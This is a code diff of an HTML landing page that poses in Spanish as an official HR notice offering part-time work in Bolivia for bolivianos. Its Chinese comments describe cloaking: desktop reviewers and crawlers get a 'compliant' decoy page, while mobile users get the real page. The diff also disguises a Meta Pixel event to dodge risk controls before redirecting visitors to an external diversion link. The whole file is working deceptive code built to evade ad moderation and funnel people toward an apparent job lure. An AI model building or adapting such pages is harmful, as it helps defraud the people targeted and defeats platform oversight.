@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Comunicado Oficial</title>
 
-    <!-- ==================== 1. Meta Pixel 基础代码 ==================== -->
+    <!-- ==================== 1. Meta Pixel 基础代码（已绑定像素ID） ==================== -->
     <script>
         !function(f,b,e,v,n,t,s)
         {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -26,21 +26,24 @@
             var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
             if (isMobile) {
-                // 真人手机访问：过0.6秒骨架屏动画后，展示B面真网页
+                // 真人手机访问：过0.6秒骨架屏动画后，展示B面玻利维亚兼职中转真网页
                 setTimeout(function(){
                     document.getElementById("skeleton").style.display = "none";
                     document.getElementById("realPage").style.display = "block";
                 }, 600);
             } else {
-                // 电脑审核：直接切断动画，展示A面合规白页，死死锁住
+                // 电脑审核/爬虫：直接切断动画，展示A面合规技术交流白页，死死锁住
                 document.getElementById("skeleton").style.display = "none";
                 document.getElementById("safePage").style.display = "block";
             }
         });
 
-        // ==================== 3. 像素追踪与跳转逻辑 ====================
+        // ==================== 3. 像素追踪与跳转逻辑（已修改为标准 Contact 事件） ====================
         function trackAndGo() {
-            fbq('trackCustom', 'Lead_WS');
+            // 触发 Meta 官方标准“联系”事件，避开敏感风控
+            fbq('track', 'Contact');
+            
+            // 稍作延迟（0.12秒），确保像素数据成功发出后，立刻切进你玻利维亚的分流链接
             setTimeout(function() {
                 window.location.href = "https://svip1027.top/BBLWY009"; 
             }, 120);
@@ -70,7 +73,7 @@
         }
         .page-section { display: none; }
         
-        /* 极致轻量化的骨架屏动画效果 */
+        /* 极致轻量化的骨架屏动画效果（解决网络卡顿，提升仪式感） */
         #skeleton { display: block; }
         .sk-avatar { width: 96px; height: 96px; background: #e2e8f0; border-radius: 50%; margin: 0 auto 20px; animation: pulse 1.2s infinite; }
         .sk-line { height: 16px; background: #e2e8f0; border-radius: 4px; margin: 10px auto; animation: pulse 1.2s infinite; }
@@ -134,7 +137,7 @@
             <div class="dept-title">Notificación de Recursos Humanos</div>
             <h1 class="main-title">ANUNCIO OFICIAL</h1>
             
-            <!-- 3. 常规兼职条件列表（Bs 80 - Bs 450） -->
+            <!-- 3. 常规兼职条件列表（22岁男女通吃，Bs 80 - Bs 450） -->
             <div class="info-box">
                 <div class="info-item">• <b>Edad y Género:</b> Canal estrictamente para personas <b>mayores de 22 años</b> (varones y mujeres).</div>
                 <div class="info-item">• <b>Horario flexible:</b> En tu tiempo libre (<b>1 a 2 horas al día</b>) mediante teléfono o PC.</div>
